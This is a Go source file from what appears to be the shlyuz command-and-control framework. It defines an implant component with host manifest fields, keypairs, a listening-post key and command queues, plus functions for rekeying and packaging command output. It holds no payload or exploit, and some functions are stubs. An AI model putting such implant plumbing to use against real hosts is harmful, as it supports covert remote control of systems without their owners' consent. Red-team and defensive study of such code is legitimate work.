package component

import (
	"bytes"
	"encoding/json"

	"shlyuz/pkg/config"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
)

type Component struct {
	// logger             log.Logger
	ConfigFile         string
	ConfigKey          []byte
	Config             config.YadroConfig
	ComponentId        string
	Manifest           ComponentManifest
	InitalKeypair      asymmetric.AsymmetricKeyPair
	CurrentKeypair     asymmetric.AsymmetricKeyPair
	CurrentLpPubkey    *[32]byte
	XorKey             int
	CmdQueue           []byte
	CmdProcessingQueue []byte
	CmdDoneQueue       []byte
}

type ComponentManifest struct {
	Implant_id       string
	Implant_os       string
	Implant_hostname string
}

// func InitalizeComponent(initFrame instructions.InstructionFrame, component) Component {
// 	// parse instruction frame for lpk argument
// 	component.CurrentLpPubkey = initFrame.CmdArgs["lpk"] // TODO: set lpk argument here
// 	return component
// }

func Rekey(frame instructions.Transaction, component Component) (Component, []byte) {
	component.CurrentLpPubkey = component.Config.CryptoConfig.LpPk
	rawRekeyFrame := instructions.CreateInstructionFrame(frame)
	rawFrameBytes := new(bytes.Buffer)
	json.NewEncoder(rawFrameBytes).Encode(rawRekeyFrame)
	rekeyFrame, newComponentKeypair := routine.PrepareTransmitFrame(rawFrameBytes.Bytes(), component.CurrentLpPubkey)
	component.CurrentKeypair = newComponentKeypair
	return component, rekeyFrame
}

// func GetCmd(frame instructions.Transaction, component Component) (Component, bool) {

// }

func SendOutput(component Component, event instructions.EventHist) instructions.Transaction {
	var outputArgs instructions.CmdOutput
	var OutputTransaction instructions.Transaction
	OutputTransaction.Cmd = "fcmd"
	OutputTransaction.ComponentId = component.ComponentId
	outputArgs.Ipk = component.CurrentKeypair.PubKey
	outputArgs.EventHistory = event
	rawOutputArgs := new(bytes.Buffer)
	json.NewEncoder(rawOutputArgs).Encode(outputArgs)
	OutputTransaction.Arg = rawOutputArgs.Bytes()
	return OutputTransaction
}

func AckCmd(frame instructions.Transaction, component Component) bool {
	return true
}
